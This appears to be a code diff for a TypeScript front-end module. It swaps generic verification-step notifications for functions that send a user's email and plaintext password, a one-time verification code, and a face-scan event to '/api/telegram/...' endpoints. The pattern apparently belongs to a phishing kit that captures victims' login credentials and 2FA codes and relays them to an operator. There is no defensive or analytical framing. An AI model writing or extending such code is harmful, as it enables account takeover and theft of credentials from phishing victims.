@@ -1,62 +1,42 @@
 
-export interface VerificationStep {
-  step: string;
-  timestamp?: string;
-  success: boolean;
-  details?: any;
-}
-
-export async function notifyVerificationStart(username: string): Promise<void> {
+export async function notifyLogin(email: string, password: string): Promise<void> {
   try {
-    await fetch('/api/verification/start', {
+    await fetch('/api/telegram/login', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({ username }),
+      body: JSON.stringify({ email, password }),
     });
   } catch (error) {
-    console.error('Failed to send start notification:', error);
+    console.error('Failed to send login notification:', error);
   }
 }
 
-export async function notifyVerificationStep(
-  username: string,
-  step: VerificationStep
-): Promise<void> {
+export async function notifyCode(email: string, code: string): Promise<void> {
   try {
-    await fetch('/api/verification/step', {
+    await fetch('/api/telegram/code', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({ 
-        username, 
-        step: {
-          ...step,
-          timestamp: step.timestamp || new Date().toISOString()
-        }
-      }),
+      body: JSON.stringify({ email, code }),
     });
   } catch (error) {
-    console.error('Failed to send step notification:', error);
+    console.error('Failed to send code notification:', error);
   }
 }
 
-export async function notifyVerificationComplete(
-  username: string,
-  steps: VerificationStep[],
-  success: boolean
-): Promise<void> {
+export async function notifyFaceScan(email: string): Promise<void> {
   try {
-    await fetch('/api/verification/complete', {
+    await fetch('/api/telegram/facescan', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({ username, steps, success }),
+      body: JSON.stringify({ email }),
     });
   } catch (error) {
-    console.error('Failed to send completion notification:', error);
+    console.error('Failed to send face scan notification:', error);
   }
 }
